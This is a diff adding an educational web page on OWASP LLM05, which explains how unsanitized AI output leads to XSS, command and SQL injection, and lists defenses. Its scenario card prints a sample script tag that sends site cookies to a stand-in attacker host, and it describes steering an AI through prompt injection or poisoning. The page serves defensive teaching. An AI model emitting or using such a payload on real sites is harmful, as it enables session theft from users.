@@ -1,0 +1,77 @@
+---
+import ContentLayout from '../../layouts/ContentLayout.astro';
+import FlipCard from '../../components/FlipCard.astro';
+import StepWalkthrough from '../../components/StepWalkthrough.astro';
+---
+
+<ContentLayout
+  title="LLM05: Improper Output Handling"
+  description="When AI-generated content is used without validation — creating injection vulnerabilities in the systems that consume it."
+  category="OWASP LLM Top 10"
+  readingTime="8 min read"
+  severity="high"
+>
+
+<h2>AI Output Is Data — Treat It That Way</h2>
+
+<p>There's a common assumption that if an AI generated something, it must be safe. After all, the AI is on your side, right? This assumption is exactly what attackers exploit.</p>
+
+<p>AI output is text. Text can contain HTML. HTML can contain scripts. Scripts can execute in browsers. Scripts can steal data, redirect users, and compromise sessions. The AI didn't intend any of this — but if its output flows directly into a web page without sanitization, the effect is indistinguishable from a deliberate attack.</p>
+
+<p>The rule is simple: <strong>treat AI-generated content like user-supplied input — as potentially dangerous until validated.</strong> Your security team already knows how to handle untrusted input. Apply the same rigor to AI output.</p>
+
+<h2>The Attack Path</h2>
+
+<FlipCard
+  scenario="Scenario: AI-Powered Content Platform"
+  frontTitle="Marketing Uses AI to Generate Product Descriptions"
+  frontContent="Your marketing team uses an AI tool to generate HTML product descriptions for your e-commerce site. The AI writes compelling copy and formats it in HTML. The output goes directly into the product database and renders on the site."
+  backTitle="How a Competitor Plants an XSS Attack"
+  backContent={`<p>A competitor learns that your site uses AI-generated descriptions. They find a way to influence the AI's context — through a poisoned training example, a crafted prompt injection in the product data the AI is given to work with, or a compromised template. The AI generates a product description that includes a script tag:</p><blockquote style="margin:0.75rem 0; padding:0.75rem 1rem; background:rgba(239,68,68,0.1); border-left:3px solid #EF4444; border-radius:4px; font-family:monospace; font-size:0.85rem; color:#1E293B;">&lt;p&gt;Premium quality product...&lt;/p&gt;&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</blockquote><p>Because the output was inserted directly into the HTML without sanitization, the script executes in customers' browsers, stealing their session cookies and allowing the attacker to impersonate them.</p><ul><li>The AI was not hacked — it was a delivery mechanism</li><li>Standard XSS prevention (output encoding, content security policy) would have prevented this entirely</li><li>The mistake was trusting AI output the same way you'd trust a trusted internal system — instead of treating it like external input</li></ul>`}
+/>
+
+<h2>Three Dangerous Output Channels</h2>
+
+<div class="threat-card">
+  <h4>Web Pages (XSS)</h4>
+  <p>AI-generated HTML inserted directly into web pages without sanitization. A script in the output executes in users' browsers. Defense: HTML encode all AI output before insertion, or use a library like DOMPurify to sanitize HTML.</p>
+</div>
+
+<div class="threat-card high">
+  <h4>System Commands and Code Execution</h4>
+  <p>AI-generated code or commands that get executed directly. An AI generates a shell command or SQL query that contains malicious additions. Defense: never execute AI-generated code in production environments without sandboxing and human review.</p>
+</div>
+
+<div class="threat-card medium">
+  <h4>Database Queries (SQL Injection via AI)</h4>
+  <p>AI generates SQL queries that are executed against a database. If an attacker can influence the AI's output (via prompt injection or poisoning), they can generate SQL that performs unauthorized operations. Defense: use parameterized queries — never concatenate AI output into SQL strings.</p>
+</div>
+
+<h2>How the Attack Chain Works</h2>
+
+<StepWalkthrough
+  title="From AI Output to System Compromise"
+  steps={[
+    { title: "Attacker influences AI context", content: "Through prompt injection, training data poisoning, or a crafted input to the AI system, the attacker influences what the AI generates. The AI itself is not compromised — it's producing output based on manipulated context.", icon: "🎯" },
+    { title: "AI generates malicious content", content: "The AI produces output that looks normal but contains embedded malicious elements: script tags in HTML, malicious command sequences, or SQL that performs unintended operations.", icon: "🤖" },
+    { title: "Output flows to downstream system", content: "The AI output is passed directly to a downstream system — a web renderer, a code executor, a database query engine — without validation or sanitization.", icon: "🔄" },
+    { title: "Downstream system executes the attack", content: "The downstream system executes the malicious content. Users' browsers run attacker scripts. Databases expose or corrupt data. Systems execute unauthorized commands. The original AI system looks clean — the breach happened downstream.", icon: "💥" },
+  ]}
+/>
+
+<div class="defense-section">
+  <h3>Four Rules for Safe AI Output Handling</h3>
+  <ol>
+    <li><strong>Never insert AI output directly into HTML without encoding or sanitization.</strong> Use established libraries (DOMPurify for JavaScript, html.escape for Python). This is the same rule as for user-supplied content — because AI output is user-influenced content.</li>
+    <li><strong>Never execute AI-generated code in production without sandboxing.</strong> If your workflow involves AI-generated code, run it in an isolated sandbox environment. Review before promoting to production.</li>
+    <li><strong>Never concatenate AI output into SQL queries.</strong> Use parameterized queries and prepared statements — exactly as you would with user input. AI output is as untrusted as user input.</li>
+    <li><strong>Apply output filtering specific to the downstream context.</strong> If AI output goes to an email system, filter for email injection patterns. If it goes to a logging system, filter for log injection patterns. Context-specific validation catches attacks that generic filters miss.</li>
+  </ol>
+</div>
+
+<div class="callout callout-info">
+  <span class="callout-icon">💡</span>
+  <p>This vulnerability is entirely preventable with existing security practices. The failure mode is treating AI output as inherently trusted. The fix is applying the same sanitization and validation your team already uses for user-supplied content.</p>
+</div>
+
+</ContentLayout>
